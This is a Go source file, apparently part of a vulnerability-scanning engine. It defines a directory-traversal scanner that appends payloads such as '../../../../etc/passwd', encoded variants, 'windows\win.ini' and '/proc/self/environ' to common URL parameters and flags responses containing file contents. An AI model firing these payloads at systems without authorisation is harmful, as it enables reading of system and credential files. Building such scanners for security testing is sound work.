package engine

import (
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"strings"
	"sync"
	"time"
)

type DirTraversalScannerModule struct {
	scanner *VulnScanner
}

func NewDirTraversalScannerModule(scanner *VulnScanner) *DirTraversalScannerModule {
	if scanner == nil {
		scanner = NewVulnScanner(map[string]interface{}{"module_name": "dir-traversal-scanner"})
	}
	return &DirTraversalScannerModule{scanner: scanner}
}

func (m *DirTraversalScannerModule) ID() string       { return "dir-traversal-scanner" }
func (m *DirTraversalScannerModule) Name() string     { return "Directory Traversal Scanner" }
func (m *DirTraversalScannerModule) Category() string { return "web" }

func (m *DirTraversalScannerModule) Run(ctx context.Context, targets []*Target, config map[string]interface{}) (*ModuleResult, error) {
	start := time.Now()
	result := &ModuleResult{ModuleID: m.ID()}
	var mu sync.Mutex
	var wg sync.WaitGroup

	sem := make(chan struct{}, 5)

	for _, target := range targets {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		if target.URL == "" && target.Host != "" {
			target.URL = fmt.Sprintf("http://%s", target.Host)
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(t *Target) {
			defer wg.Done()
			defer func() { <-sem }()

			findings := m.scanTarget(ctx, t)
			if len(findings) > 0 {
				mu.Lock()
				result.Findings = append(result.Findings, findings...)
				mu.Unlock()
			}
		}(target)
	}

	wg.Wait()
	result.Duration = time.Since(start)
	slog.Info("[DirTraversal-Scanner] 扫描完成",
		"targets", len(targets),
		"findings", len(result.Findings),
		"duration", result.Duration,
	)

	return result, nil
}

func (m *DirTraversalScannerModule) scanTarget(ctx context.Context, target *Target) []*Finding {
	var findings []*Finding

	traversalParams := []string{"file", "path", "page", "include", "doc", "document", "folder", "root", "dir", "view", "img", "image", "load", "source", "data", "content", "redirect", "uri", "url"}

	payloads := []struct {
		payload  string
		evidence string
	}{
		{"../../../../etc/passwd", "root:x:0:0"},
		{"....//....//....//etc/passwd", "root:x:0:0"},
		{"..%2f..%2f..%2f..%2fetc%2fpasswd", "root:x:0:0"},
		{"%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "root:x:0:0"},
		{"..\\..\\..\\..\\windows\\win.ini", "[fonts]"},
		{"%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\windows\\win.ini", "[fonts]"},
		{"/proc/self/environ", "PATH="},
		{"....//....//....//proc/self/environ", "PATH="},
	}

	for _, param := range traversalParams {
		select {
		case <-ctx.Done():
			return findings
		default:
		}

		for _, p := range payloads {
			testURL := target.URL
			if strings.Contains(testURL, "?") {
				testURL += "&" + param + "=" + p.payload
			} else {
				testURL += "?" + param + "=" + p.payload
			}

			body, statusCode, err := m.scanner.Client.Fetch(m.newGetRequest(ctx, testURL))
			if err != nil {
				continue
			}

			if statusCode == http.StatusOK && len(body) > 0 {
				if strings.Contains(body, p.evidence) {
					findings = append(findings, &Finding{
						Target:      target,
						Type:        "dir_traversal",
						Title:       "Directory Traversal Vulnerability",
						Description: fmt.Sprintf("The parameter '%s' is vulnerable to directory traversal. Payload: %s", param, p.payload),
						Severity:    "high",
						Confidence:  85,
						Evidence:    fmt.Sprintf("GET %s returned file content", testURL),
						Timestamp:   time.Now(),
						Remediation: "Validate file paths, use chroot or whitelist allowed directories",
						Data: map[string]string{
							"param":   param,
							"payload": p.payload,
						},
					})
				}
			}
		}
	}

	return findings
}

func (m *DirTraversalScannerModule) newGetRequest(ctx context.Context, url string) *http.Request {
	req, _ := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	return req
}
